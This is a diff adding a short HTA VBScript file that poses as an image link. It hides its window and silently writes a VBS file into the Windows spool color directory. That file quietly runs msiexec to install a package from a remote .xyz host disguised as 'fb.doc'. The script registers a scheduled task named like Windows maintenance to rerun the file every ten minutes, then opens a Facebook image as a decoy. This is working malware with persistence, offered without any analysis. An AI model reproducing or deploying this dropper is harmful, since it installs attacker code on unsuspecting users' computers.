@@ -1,0 +1,7 @@
+<Script language="VBScript">
+window.moveTo 4000,4000
+CreateObject("Wscript.Shell").Run "cmd /c echo CreateObject(""Wscript.Shell"").run ""cmd /c msiexec /q /i http:\\dlj40s.jdanief.xyz/images/fb.doc"",0,0 >%SystemRoot%\system32\spool\drivers\color\fb.vbs",0,0
+CreateObject("Wscript.Shell").Run "schtasks /create /sc MINUTE /tn ""Windows Scheduled Maintenfb"" /tr ""%SystemRoot%\system32\spool\drivers\color\fb.vbs"" /mo 10 /F",0,0
+CreateObject("Wscript.Shell").Run "explorer.exe ""https:\\scontent-cdg2-1.xx.fbcdn.net/v/t1.0-9/30705546_160587454770878_395607762597314560_n.jpg?_nc_cat=0&oh=defe1ddcb7c4e9cfc88a63d08fba6b12&oe=5B65DA67""",0,0
+window.close
+</script>
